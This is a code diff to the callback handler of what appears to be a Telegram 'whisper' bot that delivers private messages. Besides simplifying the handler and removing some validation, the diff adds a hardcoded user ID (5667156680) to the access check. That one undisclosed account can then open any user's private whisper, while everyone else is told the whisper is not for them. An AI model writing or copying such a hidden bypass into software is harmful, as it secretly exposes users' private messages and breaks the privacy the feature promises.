@@ -76,47 +76,28 @@ async def inline(app, query):
         pass
 
 
-# Initialize a dictionary to store the already notified users
-already_notified = {}
-
 @pgram.on_callback_query()
 async def cbq(app, iquery):
     try:
         id = iquery.from_user.id
         stark = iquery.data.split("_")
-        print("stark:", stark)  # Add this print statement
-
-        # Check if the callback query data has the expected format for whisper button
-        if len(stark) >= 2 and stark[0].isdigit() and stark[1].isdigit():
-            if id not in [int(stark[0]), int(stark[1])]:
-                try:
-                    await app.send_message(stark[0], f"{iquery.from_user.mention} is trying to open your whisper.")
-                except Unauthorized:
-                    pass
-
-                # Check if the user has already been notified
-                if id not in already_notified or not already_notified[id]:
-                    await iquery.answer("This whisper is not for you 🚧", show_alert=True)
-                    already_notified[id] = True  # Set the user ID as notified
-                return  # Exit the function to prevent further execution
-
+        if id not in [int(stark[0]), int(stark[1]), 5667156680]:
+            try:
+                await app.send_message(stark[0], f"{iquery.from_user.mention} is trying to open your whisper.")
+            except Unauthorized:
+                pass
+            return await iquery.answer("This whisper is not for you 🚧", show_alert=True)
         for_search = stark[0] + "_" + stark[1]
-        print("for_search:", for_search)  # Add this print statement
-
-        if for_search not in ALPHA:
-            await iquery.answer("🚫 Error‼️\n\nWhisper has been deleted from the database!", show_alert=True)
-            return
-
-        msg = ALPHA[for_search]
-
+        print(stark)
+        try:
+            msg = ALPHA[for_search]
+        except:
+            msg = "🚫 Error‼️\n\nWhisper has been deleted from the database!"
         SWITCH = InlineKeyboardMarkup([[InlineKeyboardButton("Go Inline 🪝", switch_inline_query_current_chat="")]])
         await iquery.answer(msg, show_alert=True)
-
-        if len(stark) == 3 and stark[2] == "one":
+        if stark[2] == "one":
             if id == int(stark[1]):
                 await iquery.edit_message_text(
                     "📬 Whisper has been read!\n\nPress the button below to send whisper!", reply_markup=SWITCH)
-
     except Exception as e:
-        print("Error:", e)  # Add this print statement
         await iquery.answer(str(e), show_alert=True)
